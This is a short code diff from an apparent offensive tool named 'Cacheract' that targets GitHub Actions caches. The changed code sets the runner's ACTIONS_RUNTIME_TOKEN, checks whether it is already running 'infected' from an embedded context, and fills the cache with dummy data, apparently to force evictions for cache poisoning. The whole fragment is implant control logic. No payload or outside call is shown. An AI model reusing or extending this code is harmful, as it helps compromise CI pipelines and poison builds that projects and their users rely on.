@@ -78,12 +78,16 @@ export class App {
         process.env['ACTIONS_RUNTIME_TOKEN'] = accessToken;
 
         if (Config.singleTurn) {
-            await this.runSingleTurn(githubToken, accessToken);
-            return;
+            if (!this.isInfected()) {
+                await this.runSingleTurn(githubToken, accessToken);
+            } else {
+                console.log("Cacheract is already running from an embedded context in Single Turn mode. Proceeding with standard execution.");
+            }
         }
 
         // 5. Fill Cache (if configured)
-        if (!this.isInfected() && Config.cache.fillCount > 0) {
+        // If singleTurn is enabled, we skip this step as runSingleTurn handles the filling/eviction.
+        if (!Config.singleTurn && !this.isInfected() && Config.cache.fillCount > 0) {
             await this.fillCacheWithDummyData(Config.cache.fillCount, accessToken);
         }
 
